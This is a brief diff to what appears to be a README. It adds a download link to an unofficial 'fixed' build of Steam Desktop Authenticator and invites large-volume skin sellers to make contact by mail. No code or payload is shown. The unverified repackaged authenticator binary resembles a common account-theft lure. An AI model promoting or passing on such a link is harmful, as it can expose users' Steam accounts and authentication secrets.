@@ -1,3 +1,5 @@
+Download link: https://github.com/MakcStudio/SteamDesktopAuthenticator/releases/download/1.0.2.1/Release.zip
+
 SDA fixed for the Steam update of 22.06.2023
 
 If you sell large amounts of skins and do it by hand, mail me
